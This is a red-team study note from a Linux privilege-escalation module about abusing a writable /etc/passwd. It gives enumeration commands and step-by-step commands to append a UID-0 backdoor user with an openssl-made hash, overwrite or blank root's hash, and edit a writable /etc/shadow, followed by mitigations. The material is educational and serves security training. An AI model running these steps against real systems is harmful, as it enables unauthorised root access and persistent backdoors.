---
tags: [linux, privesc, pentesting, red-team]
difficulty: intermediate
module: "44 - Linux Privilege Escalation"
topic: "44.07 Writable etc passwd"
---

# Writable /etc/passwd

## 1. Executive Summary

In Unix and Linux systems, user management and authentication rely on two critical files: `/etc/passwd` and `/etc/shadow`. 

Historically, both user information and hashed passwords were stored together in `/etc/passwd`. Because `/etc/passwd` must be globally readable for the operating system to map User IDs (UIDs) to usernames (for commands like `ls -l`), storing hashes there allowed attackers to easily exfiltrate and crack them. To mitigate this, the `/etc/shadow` file was introduced. `/etc/shadow` holds the password hashes and is only readable by `root` (and the `shadow` group).

However, due to backward compatibility, Linux authentication mechanisms still respect the legacy structure. If a system misconfiguration occurs where an unprivileged user gains **write access** to `/etc/passwd`, the attacker can inject their own user accounts with a known password hash or overwrite the `root` user directly, completely bypassing the `/etc/shadow` file.

## 2. Core Mechanics: The Fallback Mechanism

The `/etc/passwd` file contains one line per user, defined by seven colon-separated fields:
`username:password_placeholder:UID:GID:User_Info:Home_Directory:Login_Shell`

Example of the root entry:
`root:x:0:0:root:/root:/bin/bash`

The `x` in the second field is a placeholder instructing the authentication system (like PAM - Pluggable Authentication Modules) to look in `/etc/shadow` for the actual hash. 

**The Vulnerability:**
If an attacker replaces the `x` with a valid cryptographic hash, many Linux authentication systems will process the hash found in `/etc/passwd` and grant access, ignoring the `shadow` file entirely. Alternatively, if the attacker simply deletes the `x` (leaving the field empty), the system may interpret this as "no password required."

## 3. Enumeration

Checking file permissions is straightforward:
```bash
ls -la /etc/passwd /etc/shadow
```
Vulnerable Output:
`-rw-rw-rw- 1 root root 2.5K Jun  9 12:00 /etc/passwd` (World-writable)

An attacker may also check if they can write to the file via group permissions (e.g., if the file is owned by `root:developers` and the attacker is in the `developers` group).

## 4. Exploitation Methods

If `/etc/passwd` is writable, an attacker has several paths to root.

### 4.1. Method 1: Generating a New Root User (Stealthiest)
The safest method is to append a completely new user with a UID of 0 (which makes them root) and a known password.

**Step 1:** Generate a password hash. Use `openssl` to create a DES, MD5, or SHA-512 hash.
```bash
# Generating an MD5 hash for the password "password123"
openssl passwd -1 -salt evil password123
# Output: $1$evil$8A4N...
```

**Step 2:** Append a new line to `/etc/passwd`.
```bash
# Add a user named "sysadmin" with UID 0 and GID 0
echo 'sysadmin:$1$evil$8A4N...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Step 3:** Switch to the new user.
```bash
su sysadmin
# Enter "password123" when prompted
# You are now root.
```

### 4.2. Method 2: Overwriting the Root Hash
If the attacker cannot append but can modify the file (e.g., via a restricted text editor that saves over the original), they can replace the `x` in the root entry with their generated hash.
`root:$1$evil$8A4N...:0:0:root:/root:/bin/bash`
Then execute `su root` with the new password. This is highly disruptive as the real administrator can no longer log in.

### 4.3. Method 3: Passwordless Root
Removing the `x` entirely can sometimes bypass authentication.
`root::0:0:root:/root:/bin/bash`
```bash
su root
# Logs in immediately without prompting for a password
```
*Note: Modern Linux distributions and strict PAM configurations often block empty passwords for root, making Method 1 preferred.*

## 5. Alternative Vector: Writable /etc/shadow

If the `/etc/shadow` file itself is world-writable (which is extremely rare but possible via disastrous sysadmin errors), the exploitation is even simpler.

The attacker reads the file, generates a new SHA-512 hash (`mkpasswd -m sha-512 "newpassword"`), and simply replaces the hash string for the `root` user in `/etc/shadow`.

Example shadow entry:
`root:$6$v/H3kQ...$zR3m...:18790:0:99999:7:::`
The attacker just overwrites the hash portion between the first and second colons.

## 6. Authentication Fallback Flow (ASCII Diagram)

```text
+--------------------------------------------------------------------------------+
|                   /etc/passwd AUTHENTICATION FALLBACK BYPASS                   |
+--------------------------------------------------------------------------------+
|                                                                                |
|  [ ATTACKER COMMAND ]                                                          |
|  $ su sysadmin                                                                 |
|          |                                                                     |
|          v                                                                     |
|  +----------------------------------------+                                    |
|  | PLUGGABLE AUTHENTICATION MODULES (PAM) |                                    |
|  +----------------------------------------+                                    |
|          |                                                                     |
|          | 1. Read /etc/passwd                                                 |
|          v                                                                     |
|  +--------------------------------------------------------------------------+  |
|  | /etc/passwd                                                              |  |
|  | sanchit:x:1000:1000:user:/home/sanchit:/bin/bash                         |  |
|  | root:x:0:0:root:/root:/bin/bash                                          |  |
|  | sysadmin:$1$evil$8A4...:0:0:root:/root:/bin/bash  <-- INJECTED BY ATTACK |  |
|  +--------------------------------------------------------------------------+  |
|          |                                                                     |
|          | 2. Checks second field of requested user (sysadmin)                 |
|          v                                                                     |
|  +-----------------------------------+                                         |
|  | Is the field 'x'?                 |                                         |
|  +-----------------------------------+                                         |
|         /                     \                                                |
|       YES                      NO (It contains a hash)                         |
|       /                         \                                              |
|      v                           v                                             |
| [ Read /etc/shadow ]        [ Validate hash directly from /etc/passwd ]        |
|                             [ Bypass /etc/shadow completely!          ]        |
|                                          |                                     |
|                                          v                                     |
|                             +----------------------------+                     |
|                             | AUTHENTICATION SUCCESSFUL  |                     |
|                             | Spawning /bin/bash (UID=0) |                     |
|                             +----------------------------+                     |
|                                                                                |
+--------------------------------------------------------------------------------+
```

## 7. Mitigation Strategies

1. **Strict File Permissions:** Ensure `/etc/passwd` remains `-rw-r--r--` (644) and owned by `root:root`. Ensure `/etc/shadow` remains `-rw-r-----` (640 or 600) and owned by `root:shadow` or `root:root`.
2. **File Integrity Monitoring (FIM):** Deploy tools like `AIDE`, `Tripwire`, or configure `auditd` rules to monitor any write operations to `/etc/passwd` and `/etc/shadow` by any user other than standard package managers or authentication daemons.

## 8. Chaining Opportunities

- **NFS Root Squashing Misconfiguration:** An attacker finds an NFS share exported with `no_root_squash` that mounts the target server's `/` directory. They mount it locally on their attacker machine as root, edit the remote `/etc/passwd` file, unmount, and SSH into the target as the newly created root user.
- **Arbitrary File Write Vulns:** An application vulnerability (e.g., an unauthenticated arbitrary file upload via a web app that places files in specified directories, or a directory traversal vulnerability in a `file_put_contents` PHP script) allows writing directly to `/etc/passwd`.

## 9. Related Notes
- [[01 - Linux PrivEsc Methodology Overview]]
- [[02 - Enumeration Tools]]
- [[03 - SUID Binaries Abuse]]
- [[05 - Capabilities Abuse]]
- [[06 - Sudo Misconfigurations]]
